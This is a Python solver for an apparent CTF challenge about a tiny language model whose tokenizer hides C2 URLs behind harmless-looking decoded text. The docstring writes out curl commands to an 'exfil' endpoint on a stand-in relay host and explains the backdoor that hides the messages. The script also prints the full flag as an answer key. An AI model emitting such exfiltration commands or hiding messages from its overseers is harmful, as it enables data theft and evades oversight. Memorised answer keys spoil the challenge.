#!/usr/bin/env python3
"""Forked Tongue - Cyber Apocalypse CTF 2026 (AI - ML, medium).

`tokenizer.json` ships two disagreeing definitions of the same 480 token ids.
`vocab` maps them to innocent status-report fragments; `merges` maps them --
per the id convention `manifest.json` spells out -- to fragments of two C2
URLs. 47 of the 480 ids are forged, and the model only ever emits forged ids
when it answers petitions 1 and 3.

Decoding those two answers through `merges` instead of `vocab` yields:

    curl https://c2.cinderbound-relay.net/exfil?key=<b64>
    curl https://c2.cinderbound-relay.net/register?pad=<b64>

and `manifest.json` gives the last step outright:

    flag = cipher XOR shake_256(pad).digest(len(cipher))

The relay domain is flavor -- nothing here touches the network.

Usage: python3 solve.py [path/to/handout]   (needs torch; no args = self-check)
"""

import base64
import hashlib
import json
import os
import re
import sys

# `<|user|>` is 736; every real token id is below it. Specials carry no bytes.
FIRST_SPECIAL_ID = 736

SECRET = re.compile(r"[?&](key|pad)=([A-Za-z0-9+/=]+)")


def byte_decoder():
    """GPT-2 byte-level alphabet, inverted: printable char -> raw byte."""
    bs = list(range(33, 127)) + list(range(161, 173)) + list(range(174, 256))
    cs = bs[:]
    extra = 0
    for value in range(256):
        if value not in bs:
            bs.append(value)
            cs.append(256 + extra)
            extra += 1
    return {char: value for value, char in zip(bs, map(chr, cs))}


def merge_table(tokenizer):
    """The authoritative id -> token string map, built the way manifest.json says.

    ids 0..255 are the single-byte alphabet; id 256+n is the n-th merge rule
    with its two halves concatenated. `vocab` is never consulted above 255 --
    that is the whole trick.
    """
    table = {i: t for t, i in tokenizer["model"]["vocab"].items() if i < 256}
    for index, merge in enumerate(tokenizer["model"]["merges"]):
        left, right = merge.split(" ", 1)
        table[256 + index] = left + right
    return table


def decode(ids, table, reverse_bytes):
    text = "".join(table[i] for i in ids if i < FIRST_SPECIAL_ID)
    return bytes(reverse_bytes[c] for c in text).decode()


def recover(key, pad):
    """manifest.json: flag = cipher XOR shake_256(pad).digest(len(cipher))."""
    mask = hashlib.shake_256(pad).digest(len(key))
    return bytes(a ^ b for a, b in zip(key, mask)).decode()


def solve(root):
    import torch  # only needed for the generation half

    sys.path.insert(0, root)
    from model import GPTConfig, TinyGPT

    tokenizer = json.load(open(os.path.join(root, "tokenizer.json")))
    prompts = json.load(open(os.path.join(root, "prompts.json")))
    table, reverse_bytes = merge_table(tokenizer), byte_decoder()

    # weights_only=True is enough here; the checkpoint is just {state_dict, config}.
    checkpoint = torch.load(
        os.path.join(root, "model.pt"), map_location="cpu", weights_only=True
    )
    model = TinyGPT(GPTConfig(**checkpoint["config"]))
    model.load_state_dict(checkpoint["state_dict"])

    secrets = {}
    for request in prompts["requests"]:
        prefix = request["input_ids"]
        ids = model.generate(
            torch.tensor([prefix]), prompts["max_new_tokens"], prompts["eos_id"]
        )[0].tolist()[len(prefix):]
        match = SECRET.search(decode(ids, table, reverse_bytes))
        if match:
            secrets[match.group(1)] = base64.b64decode(match.group(2), validate=True)

    return recover(secrets["key"], secrets["pad"])


def demo():
    """Self-check on the two values the model emits, no torch required."""
    key = base64.b64decode(
        "SdHpcTbtoxeWrFXraoaBmY8F43qj+LTJnSz2LbgX8N3m+hQyvhjD3Q=="
    )
    pad = base64.b64decode("SLx4i4WtUZDb8vu8qpj8juT8p8sUj9D6XBNCmyJfSxQ=")
    flag = recover(key, pad)
    assert flag == "HTB{th3_h3r4ld_l13s_but_th3_m3rg35_d0nt}", flag
    print("self-check ok:", flag)


if __name__ == "__main__":
    if len(sys.argv) > 1:
        print(solve(sys.argv[1]))
    else:
        demo()
